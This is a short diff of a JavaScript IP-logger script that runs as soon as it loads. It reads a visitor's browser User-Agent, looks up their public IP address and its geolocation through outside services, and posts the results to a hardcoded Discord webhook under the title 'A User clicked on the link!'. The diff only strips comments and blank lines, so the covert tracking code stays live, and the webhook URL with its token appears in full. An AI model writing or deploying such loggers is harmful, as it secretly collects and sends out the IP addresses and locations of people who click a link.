@@ -1,16 +1,13 @@
 const sendIP = () => {
-    const userAgent = navigator.userAgent; // Capture the browser's User-Agent
-
+    const userAgent = navigator.userAgent;
     fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
-
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
                     const dscURL = 'https://discord.com/api/webhooks/1410930902707601418/OL94ZgkySxNkxbaP0EfYkVRaOiNIPgnTOemhhqlHmn6n3Uj7oqlpHaB8MXuzbHaPHe9m'; // Replace with your webhook URL
-
                     const embed = {
                         title: 'A User clicked on the link!',
                         description: `**IP Address >>** ${ipadd}
@@ -51,5 +48,5 @@ const sendIP = () => {
         });
 };
 
-// Run the logger
 sendIP();
+
